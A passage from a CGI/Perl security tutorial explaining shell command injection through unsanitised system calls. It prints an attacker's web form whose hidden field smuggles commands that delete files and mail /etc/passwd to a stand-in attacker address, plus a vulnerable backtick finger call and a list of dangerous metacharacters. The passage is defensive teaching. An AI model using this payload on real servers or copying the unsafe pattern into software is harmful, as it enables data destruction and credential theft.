with the form’s message written to a temp file mailed to Jane Steak. A few days after the system administrator installs this script in the cgi-bin directory, she finds that hackers have broken into the system and compromised valuable files, all thanks to Jane’s script. How? Imagine that the hacker has set up a Web page on his end like the following.

```
<HTML><body>
<h1>Hacking beef.com!</h1>
<form action="http://www.beef.com/CGI-bin/doit.pl" method = "get">
<input type="hidden" name="myaddress" value="; rm * ;mail -s Haha hacker@bacon.com </etc/passwd;">
<input type = "text" name=input>
<input type = "submit" value="Hack Away!">
</form>
```

The semicolons in the hidden value field act as delimiters, which separate UNIX commands, enabling several to be executed on the same line in a shell. The system call in Perl spawns a UNIX shell and, in this case, executes the commands in the value field, removing the current files in the directory and mailing the password file to the hacker.

The first lesson here is that user input to a CGI script can never be trusted. The second lesson is to avoid using system calls promiscuously in Perl, or any language for that matter.

# Other System Call Holes

Any CGI system call is inherently dangerous if not coded correctly. Consider the following line of Perl code. (Remember, Perl backticks follow shell conventions — that is, a UNIX subshell is spawned with the quoted string as the command line, and the output of that command becomes the argument for the Perl command.)

```
print `/usr/local/bin/finger $userinput`;
```

This could be taken advantage of by using the same malicious user input as before. In general, none of the following metacharacters belong in user input.

```
; > < & * ` | $ #
```